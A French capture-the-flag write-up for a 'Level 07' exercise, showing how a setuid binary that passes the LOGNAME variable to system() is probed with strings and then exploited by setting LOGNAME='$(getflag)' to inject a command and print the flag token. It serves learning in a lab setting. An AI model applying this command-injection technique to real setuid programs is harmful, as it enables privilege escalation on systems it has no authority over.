# Level 07

Structure du home
```sh
$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```
On peut apercevoir un exécutable. Si on l'exécute il nous écrit seulement `level07`.

En tout premier avant de peu être le décompiler, on peut lancer `strings` dessus
```
$ strings ./level07
/lib/ld-linux.so.2
__gmon_start__
...
_IO_stdin_used
asprintf
getenv
system
...
__libc_start_main
...
LOGNAME
/bin/echo %s
...
```
Plein de choses intéressantes se montre à nous, comme les fonctions ou même les strings utilisés.
Comme les fonctions `getenv`, `system`, `asprintf`. Ce qui voudrait dire que l'exécutable fait appeler à une variable d'environnement, exécute peut-être `/bin/echo %s` et le pourcentage `%s` comme une valeur dynamique set via l'asprintf ?

Mettons nos infos au test:
- Dans un premier temps, le string `LOGNAME` est-elle la variable env?
- Et si nous changeons la variable.
- Grâce à la fonction system, on pourrait exécuter autre chose que `/bin/echo`
```sh
$ echo $LOGNAME
level07
$ export LOGNAME=getflag
$ ./level07
getflag
$ export LOGNAME='$(getflag)'
$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
